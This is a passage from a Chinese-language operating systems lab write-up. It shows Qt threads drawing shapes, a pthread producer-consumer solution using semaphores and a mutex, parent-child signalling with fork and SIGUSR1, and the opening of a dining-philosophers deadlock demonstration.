class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个与线程相关的类，一个是圆形线程类，一个是方形线程类，它们都是Qt的线程类QThread的子类。由于它们在坐标点计算上仅有差异，我将选择圆形线程类进行说明：</p><p>圆形线程类中的process函数用于处理下一个坐标点，然后发出circlePoint信号，将该坐标传递给主线程进行处理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CircleThread::process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> radianIncrement = <span class="number">2</span> * (M_PI / <span class="number">180.0</span>); <span class="comment">// 每次的弧度增量（1度）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算新点位置，以圆的参数方程为例</span></span><br><span class="line">    <span class="type">int</span> centerX = center.<span class="built_in">x</span>();</span><br><span class="line">    <span class="type">int</span> centerY = center.<span class="built_in">y</span>();</span><br><span class="line">    <span class="type">int</span> x = centerX + <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(radius * <span class="built_in">cos</span>(circleAngle));</span><br><span class="line">    <span class="type">int</span> y = centerY + <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(radius * <span class="built_in">sin</span>(circleAngle));</span><br><span class="line">    circleAngle += radianIncrement;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送新点位置</span></span><br><span class="line">    <span class="function">emit <span class="title">circlePoint</span><span class="params">(QPoint(x, y))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于圆形线程类，我们需要重写run函数。run函数在线程启动时被调用。具体逻辑是以间隔调用process函数，process函数处理点信息，然后将其发送到主线程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CircleThread::run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">isInterruptionRequested</span>()) &#123;</span><br><span class="line">        <span class="built_in">process</span>();</span><br><span class="line">        <span class="keyword">if</span> (circleAngle &gt;= <span class="number">2</span> * M_PI) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">msleep</span>(<span class="number">62</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主线程需要做的是初始化圆形线程类的实例，并将之前提到的circlePoint信号与处理点的槽连接。注意，槽函数以Lambda表达式的形式编写，将子线程返回的点添加到圆形点集合中，然后更新绘图。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建圆形绘制线程</span></span><br><span class="line">circleThread = <span class="keyword">new</span> <span class="built_in">CircleThread</span>(<span class="keyword">this</span>, <span class="built_in">QPoint</span>(<span class="built_in">width</span>() / <span class="number">4</span>, <span class="built_in">height</span>() / <span class="number">2</span> - <span class="built_in">height</span>() / <span class="number">10</span>), <span class="built_in">qMin</span>(<span class="built_in">width</span>() / <span class="number">2</span>, <span class="built_in">height</span>()) / <span class="number">2</span> - <span class="number">50</span>);</span><br><span class="line"><span class="comment">// 将圆形绘制线程的数据发送信号与主线程的数据接收槽函数连接</span></span><br><span class="line"><span class="built_in">connect</span>(circleThread, &amp;CircleThread::circlePoint, <span class="keyword">this</span>, [&amp;](<span class="type">const</span> QPoint &amp;pt) &#123;</span><br><span class="line">    circlePoints.<span class="built_in">append</span>(pt);</span><br><span class="line">    <span class="comment">// 更新以调用paintEvent</span></span><br><span class="line">    <span class="built_in">update</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>最后一步相对简单。我们需要启动线程，线程的启动由“开始绘制”按钮控制。点击它会启动两个线程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一个用于连接按钮点击信号的槽函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindow::on_startpaint_clicked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 启动圆形绘制线程</span></span><br><span class="line">    circleThread-&gt;<span class="built_in">start</span>();</span><br><span class="line">    <span class="comment">// 启动方形绘制线程</span></span><br><span class="line">    squareThread-&gt;<span class="built_in">start</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，启动程序。程序执行效果如下：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/双线程画圆方.gif"alt="程序执行效果" /><figcaption aria-hidden="true">程序执行效果</figcaption></figure><p>参考资料：</p><p><ahref="https://blog.csdn.net/qq_48985554/article/details/114990083">Qt多线程方法1（逐步解释+代码+演示）</a></p><p><a href="https://doc.qt.io/">Qt文档</a></p><h2id="任务4使用线程实现windows或linux中的生产者-消费者同步控制">任务4：使用线程实现Windows或Linux中的“生产者-消费者”同步控制</h2><p>任务要求：</p><ol type="1"><li>使用一个数组（10个元素）代替缓冲区。2个输入线程生成产品（随机数）并存储在数组中；3个输出线程从数组中取出数字并输出。</li><li>Linux使用互斥对象和轻量级信号量对象，主要函数：sem_wait()、sem_post()、pthread_mutex_lock()、pthread_mutex_unlock()。</li><li>生产者1的数据：1000-1999（每个数据随机间隔100ms-1s），生产者2的数据：2000-2999（每个数据随机间隔100ms-1s）。</li><li>消费者随机睡眠100ms-1s以消费一个数据。</li><li>屏幕打印（或日志文件记录）每个数据的生产和消费记录。</li></ol><p>源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 缓冲区和相关同步机制</span></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>, out = <span class="number">0</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;</span><br><span class="line"><span class="type">sem_t</span> empty, full;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机睡眠时间</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">random_sleep</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> rand() % <span class="number">901</span> + <span class="number">100</span>; <span class="comment">// 随机时间从100ms到1s</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者线程函数</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">producer</span><span class="params">(<span class="type">void</span> *param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)param;</span><br><span class="line">    <span class="type">int</span> base = id == <span class="number">1</span> ? <span class="number">1000</span> : <span class="number">2000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> product = base + rand() % <span class="number">1000</span>;</span><br><span class="line">        sem_wait(&amp;empty);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存储产品到缓冲区</span></span><br><span class="line">        buffer[in] = product;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;生产者 %d 生产了 %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sem_post(&amp;full);</span><br><span class="line"></span><br><span class="line">        usleep(random_sleep() * <span class="number">1000</span>); <span class="comment">// 睡眠</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者线程函数</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">consumer</span><span class="params">(<span class="type">void</span> *param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)param;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sem_wait(&amp;full);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从缓冲区取出产品</span></span><br><span class="line">        <span class="type">int</span> product = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;消费者 %d 消费了 %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sem_post(&amp;empty);</span><br><span class="line"></span><br><span class="line">        usleep(random_sleep() * <span class="number">1000</span>); <span class="comment">// 睡眠</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> producers[<span class="number">2</span>], consumers[<span class="number">3</span>];</span><br><span class="line">    <span class="type">int</span> producer_ids[<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">int</span> consumer_ids[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化互斥锁，使用默认属性</span></span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 第二个参数0表示信号量用于线程间同步</span></span><br><span class="line">    sem_init(&amp;empty, <span class="number">0</span>, BUFFER_SIZE); <span class="comment">// 初始为空槽位为BUFFER_SIZE</span></span><br><span class="line">    sem_init(&amp;full, <span class="number">0</span>, <span class="number">0</span>);            <span class="comment">// 初始没有可消费的产品</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建生产者和消费者线程</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;producers[i], <span class="literal">NULL</span>, producer, &amp;producer_ids[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;consumers[i], <span class="literal">NULL</span>, consumer, &amp;consumer_ids[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待线程结束</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(producers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(consumers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁互斥锁和信号量</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    sem_destroy(&amp;empty);</span><br><span class="line">    sem_destroy(&amp;full);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码分析：</p><p>首先，我们应该在产品区添加互斥锁，以防止多个线程同时访问。然后我们需要确保当产品缓冲区满时，生产者停止生产；当没有产品时，消费者无法消费。因此我们需要P-V操作来完成同步机制。empty信号表示当前缓冲区中的空槽位。每当生产者开始生产时，空槽位减少1；消费者消费后，空槽位增加1。full信号表示当前缓冲区中的产品数量。当消费者开始消费时，减少1；当生产者完成生产时，增加1。这实现了生产者和消费者之间的同步机制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*生产者*/</span></span><br><span class="line">sem_wait(&amp;empty);</span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储产品到缓冲区</span></span><br><span class="line">buffer[in] = product;</span><br><span class="line">in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;生产者 %d 生产了 %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">sem_post(&amp;full);</span><br><span class="line"><span class="comment">/*生产者*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*消费者*/</span></span><br><span class="line">sem_wait(&amp;full);</span><br><span class="line">pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从缓冲区取出产品</span></span><br><span class="line"><span class="type">int</span> product = buffer[out];</span><br><span class="line">out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;消费者 %d 消费了 %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">sem_post(&amp;empty);</span><br><span class="line"><span class="comment">/*消费者*/</span></span><br></pre></td></tr></table></figure><p>程序执行结果如下：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/4-result.png"alt="程序执行结果" /><figcaption aria-hidden="true">程序执行结果</figcaption></figure><p>使用ps命令查看当前进程中的所有线程：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/4-ps.png"alt="使用ps命令查看当前进程中的所有线程" /><figcaptionaria-hidden="true">使用ps命令查看当前进程中的所有线程</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/WCHAN-explain.png"alt="WCHAN解释" /><figcaption aria-hidden="true">WCHAN解释</figcaption></figure><p>参考资料：</p><p><ahref="https://blog.csdn.net/star_fighting/article/details/104309371">线程同步问题- 生产者消费者</a></p><h2id="任务5使用信号机制signal在linux中实现进程间通信">任务5：使用信号机制（signal）在Linux中实现进程间通信</h2><p>任务要求：</p><ol type="1"><li>父进程创建（fork）子进程，并使子进程进入无限循环。</li><li>子进程每2秒输出“I am Child Process, alive !”。</li><li>父进程询问用户“To terminate Child Process. Yes or No?”，要求用户从键盘回答Y或N。如果用户回答N，延迟2秒后再询问。</li><li>如果用户回答Y，发送用户信号给子进程使其结束。</li><li>在子进程结束前，打印字符串：“Bye,World !”。</li><li>函数：kill()、signal()，使用用户信号，编写信号处理函数。</li></ol><p>本任务的核心是使用kill函数终止子进程，并在杀死时传递信号SIGUSR1（用户定义的信号，可用于报告异常行为，如除零错误、段错误等，或控制进程，如终止进程、停止（暂停）进程、继续（恢复）停止的进程等）。子进程接收信号并调用signalHandler信号处理函数执行相应操作。</p><p>源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 信号处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signalHandler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bye, World!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 子进程</span></span><br><span class="line">    </span><br><span class="line">        signal(SIGUSR1, signalHandler); <span class="comment">// 注册信号处理函数</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;I am Child Process, alive!\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 父进程</span></span><br><span class="line">        <span class="type">char</span> answer;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;To terminate Child Process. Yes or No?\n&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;answer);</span><br><span class="line">            <span class="keyword">if</span> (answer == <span class="string">&#x27;N&#x27;</span> || answer == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (answer != <span class="string">&#x27;Y&#x27;</span> &amp;&amp; answer != <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        kill(pid, SIGUSR1); <span class="comment">// 发送SIGUSR1信号给子进程</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// 等待子进程结束</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// fork失败</span></span><br><span class="line">        perror(<span class="string">&quot;fork failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码执行结果：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/5-result.png"alt="代码执行结果" /><figcaption aria-hidden="true">代码执行结果</figcaption></figure><p>参考资料：</p><p><a href="https://zhuanlan.zhihu.com/p/113876980">Linux进程间通信讲座3信号 signal kill</a></p><h2id="任务6在windows或linux中模拟哲学家就餐提供死锁和非死锁解决方案">任务6：在Windows或Linux中模拟哲学家就餐，提供死锁和非死锁解决方案</h2><p>任务要求：</p><ol type="1"><li>提供可能导致死锁的解决方案和绝对不会导致死锁的解决方案。</li><li>对于可能导致死锁的解决方案，参考课程材料。Windows尝试使用临界区对象（EnterCriticalSection，LeaveCriticalSection）；Linux尝试使用互斥锁（pthread_mutex_lock，pthread_mutex_unlock）。</li><li>绝对不会导致死锁的解决方案，例如：尝试同时拿起两根筷子，如果都能拿起则拿起，否则不拿起任何一根。</li><li>Linux尝试互斥函数pthread_mutex_lock，pthread_mutex_trylock等。</li><li>为增强随机性，保持状态之间的随机持续时间为100ms-500ms。</li><li>[可选] 图形界面显示哲学家拿起筷子、吃饭、放下筷子、思考等。</li></ol><h3 id="死锁解决方案">死锁解决方案</h3><p>死锁解决方案的问题在于每个哲学家先拿起左边的筷子，然后再拿起右边的筷子。当他们同时拿起左边的筷子时，没有哲学家能拿到右边的筷子，造成死锁问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHILOSOPHER_COUNT 5</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> chopsticks[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_random_sleep_time</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> rand() % <span class="number">400000</span> + <span class="number">100000</span>; <span class="comment">// 100ms到500ms的随机时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">philosopher</span><span class="params">(<span class="type">void</span> *num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)num;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 在思考\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// 随机思考时间</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 在休息\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// 随机休息时间</span></span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;chopsticks[id]); <span class="comment">// 拿起左边的筷子</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 拿起左边的筷子\n&quot;</span>, id);</span><br><span class="line">        pthread_mutex_lock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]); <span class="comment">// 拿起右边的筷子</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 拿起右边的筷子\n&quot;</span>, id);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 在吃饭\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// 随机吃饭时间</span></span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;chopsticks[(id + <span class="number">1</span>) % 